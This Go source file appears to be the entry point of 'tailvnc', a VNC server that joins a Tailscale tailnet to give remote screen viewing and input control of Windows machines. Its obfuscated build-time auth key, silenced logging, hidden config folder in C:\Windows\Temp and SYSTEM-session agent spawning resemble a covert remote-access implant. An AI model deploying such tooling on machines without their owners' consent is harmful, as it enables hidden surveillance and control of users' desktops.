package main

import (
	"io"
	"log"
	"net"
	"os"
	"tailvnc/pkg/deobfuscator"
	"tailvnc/pkg/utils"
	"tailvnc/pkg/vnc"

	"tailscale.com/tsnet"
)

func setupFileLog(path string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("WARNING: cannot open log file %s: %v", path, err)
		return
	}
	log.SetOutput(io.MultiWriter(f, os.Stderr))
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds)
	log.Printf("=== log opened: %s ===", path)
}

// Build-time injected directory to store and retrieve persistent config data used by tsnet
var buildWithConfigDir string

// Build-time injected obfuscated key (hex string)
var buildWithObfuscatedAuthKey string

// Build-time injected control server URL
var buildWithControlURL string

// Build-time injected listening port
var buildWithListenPort string

// Build-time injected vnc auth password
var buildWithAuthPass string

// agentPort returns the port number from "--agent <port>" in os.Args,
// or an empty string if this is not an agent invocation.
func agentPort() string {
	args := os.Args[1:]
	for i, a := range args {
		if a == "--agent" && i+1 < len(args) {
			return args[i+1]
		}
	}
	return ""
}

// runAgent runs a local VNC server on 127.0.0.1:<port>.
// Called when the process is spawned as a user-session agent by the service.
// Screen capture and input injection work correctly here because the process
// is running inside the interactive user session (not Session 0 / SYSTEM).
func runAgent(port string) {
	// setupFileLog(`C:\Windows\Temp\tailvnc-agent.log`)
	log.Printf("[agent] starting on 127.0.0.1:%s", port)

	ln, err := net.Listen("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatalf("[agent] listen: %v", err)
	}
	defer ln.Close()

	srv := &vnc.Server{}
	srv.RunLocal(ln)
}

type TailVNC struct {
	server *tsnet.Server
}

func (t *TailVNC) startServer(listenPort string, authPass string) error {
	listener, err := t.server.Listen("tcp", ":"+listenPort)
	if err != nil {
		return err
	}
	defer listener.Close()

	log.Printf("VNC server started: %s:%s", t.server.Hostname, listenPort)

	srv := &vnc.Server{Password: authPass}

	if vnc.GetCurrentSessionID() == 0 {
		// Running as SYSTEM in Session 0 (e.g. as a service or via psexec -s).
		// Spawn an agent in the interactive user session and proxy connections.
		log.Println("detected Session 0 – starting in service mode")
		srv.RunAsService(listener)
	} else {
		// Already in an interactive session; capture and inject directly.
		srv.RunLocal(listener)
	}

	return nil
}

func main() {
	// Agent mode: spawned by the service inside the user's session.
	// Must be checked before anything else (before auth-key guard, before tsnet).
	if port := agentPort(); port != "" {
		runAgent(port)
		return
	}

	// setupFileLog(`C:\Windows\Temp\tailvnc-service.log`)

	hostName := utils.GetSystemHostname()
	authKey := ""
	controlURL := ""
	listenPort := "5900"
	authPass := ""
	configDir := "C:\\Windows\\Temp\\.config"

	if buildWithConfigDir != "" {
		configDir = buildWithConfigDir
	}

	if buildWithObfuscatedAuthKey != "" {
		authKey = deobfuscator.DeobfuscateAuthKey(buildWithObfuscatedAuthKey)
	} else {
		return
	}

	if buildWithControlURL != "" {
		controlURL = buildWithControlURL
	}

	if buildWithListenPort != "" {
		listenPort = buildWithListenPort
	}

	if buildWithAuthPass != "" {
		authPass = buildWithAuthPass
	}

	log.Printf("Starting proxy as %s", hostName)

	s := &tsnet.Server{
		Hostname:   hostName,
		AuthKey:    authKey,
		ControlURL: controlURL,
		Logf:       func(format string, args ...interface{}) {},
	}

	if err := os.MkdirAll(configDir, 0700); err != nil {
		log.Fatal(err)
	}
	s.Dir = configDir

	tailVNC := &TailVNC{server: s}

	if err := tailVNC.startServer(listenPort, authPass); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
